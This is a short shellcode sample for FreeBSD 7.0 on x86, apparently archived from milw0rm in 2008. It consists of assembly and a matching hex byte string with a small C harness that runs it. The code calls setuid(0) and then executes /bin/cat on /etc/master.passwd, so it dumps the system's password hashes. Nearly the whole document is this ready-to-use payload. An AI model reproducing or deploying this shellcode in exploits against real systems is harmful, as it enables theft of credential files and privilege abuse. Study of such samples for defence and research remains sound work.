; sm4x 2008
; /bin/cat /etc/master.passwd
; 65 bytes
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
int     0x80

; --- setup /etc/master.passwd
jmp     short   load_file
ok:
pop     esi

; setup /bin/cat
push    eax
push    0x7461632f
push    0x6e69622f
mov     ebx, esp

; --- array setup
push    eax     ; null
push    esi     ; /etc/master.passwd
push    ebx     ; /bin/cat
mov     edx, esp

; -- execve()
push    eax     ; 0
push    edx     ; array { "/bin/cat", "/etc/master.passwd", 0}
push    ebx     ; /bin/cat
mov     al, 0x3b
push    eax
int     0x80

; --- exit
push    eax
push    eax
int     0x80

load_file:
call    ok
db      '/etc/master.passwd'

/*

char code[] = "\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f"
       "\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
       "\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50"
       "\x52\x53\xb0\x3b\x50\xcd\x80\x50\x50\xcd"
       "\x80\xe8\xdc\xff\xff\xff\x2f\x65\x74\x63"
       "\x2f\x6d\x61\x73\x74\x65\x72\x2e\x70\x61"
       "\x73\x73\x77\x64";

int main(int argc, char **argv) {
        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
        (int)(*func)();
}

*/

; milw0rm.com [2008-08-25]